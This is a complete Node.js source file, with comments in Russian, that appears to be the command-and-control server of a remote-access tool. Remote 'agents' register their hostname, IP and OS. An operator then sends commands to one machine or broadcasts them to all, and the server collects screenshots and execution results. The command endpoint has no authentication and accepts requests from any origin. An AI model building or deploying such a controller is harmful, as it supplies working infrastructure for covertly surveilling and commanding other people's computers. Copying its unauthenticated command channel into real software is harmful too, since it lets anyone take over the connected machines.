const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

app.use(cors());
app.use(express.static(__dirname));

// Хранилище подключенных агентов
const agents = new Map();
const logs = [];

// WebSocket обработка
io.on('connection', (socket) => {
    console.log('🔵 Новое подключение:', socket.id);
    
    // Регистрация агента
    socket.on('register', (data) => {
        const agentData = {
            id: socket.id,
            name: data.hostname,
            ip: data.ip,
            os: data.os,
            online: true,
            lastSeen: new Date(),
            socket: socket
        };
        
        agents.set(socket.id, agentData);
        
        // Отправляем обновленный список всем
        broadcastAgents();
        
        // Добавляем в лог
        addLog('info', `🟢 ${data.hostname} подключился`, data.hostname);
        
        // Звук подключения (опционально)
        io.emit('sound', 'online');
    });
    
    // Получение команды от панели управления
    socket.on('command', (data) => {
        const { target, command, params } = data;
        
        if (target === 'ALL') {
            // Рассылка всем агентам
            agents.forEach((agent, id) => {
                agent.socket.emit('execute', { command, params });
            });
            addLog('command', `📢 Broadcast: ${command}`, 'SYSTEM');
        } else {
            // Конкретному агенту
            const targetAgent = Array.from(agents.values())
                .find(a => a.name === target);
            
            if (targetAgent) {
                targetAgent.socket.emit('execute', { command, params });
                addLog('command', `🎯 ${target}: ${command}`, 'SYSTEM');
            }
        }
    });
    
    // Получение скриншота
    socket.on('screenshot', (data) => {
        io.emit('screenshot_update', {
            agent: data.hostname,
            image: data.image
        });
    });
    
    // Результат выполнения команды
    socket.on('result', (data) => {
        addLog('result', data.message, data.hostname);
        io.emit('command_result', data);
    });
    
    // Отключение
    socket.on('disconnect', () => {
        const agent = agents.get(socket.id);
        if (agent) {
            addLog('info', `🔴 ${agent.name} отключился`, agent.name);
            agents.delete(socket.id);
            broadcastAgents();
        }
    });
});

function broadcastAgents() {
    const agentList = Array.from(agents.values()).map(a => ({
        name: a.name,
        online: true,
        os: a.os,
        lastSeen: a.lastSeen
    }));
    io.emit('agents_update', agentList);
}

function addLog(type, message, source) {
    const log = {
        timestamp: new Date(),
        type,
        message,
        source
    };
    logs.push(log);
    if (logs.length > 1000) logs.shift();
    io.emit('log', log);
}

// API для получения списка агентов
app.get('/api/agents', (req, res) => {
    const agentList = Array.from(agents.values()).map(a => ({
        name: a.name,
        online: true,
        os: a.os
    }));
    res.json(agentList);
});

// API для отправки команды
app.post('/api/command', express.json(), (req, res) => {
    const { target, command, params } = req.body;
    io.emit('command', { target, command, params });
    res.json({ status: 'ok' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔════════════════════════════════════════╗
    ║   🚀 CYBER CONTROL SERVER ONLINE      ║
    ║   Порт: ${PORT}                          ║
    ║   Время: ${new Date().toLocaleString()}   ║
    ╚════════════════════════════════════════╝
    `);
});
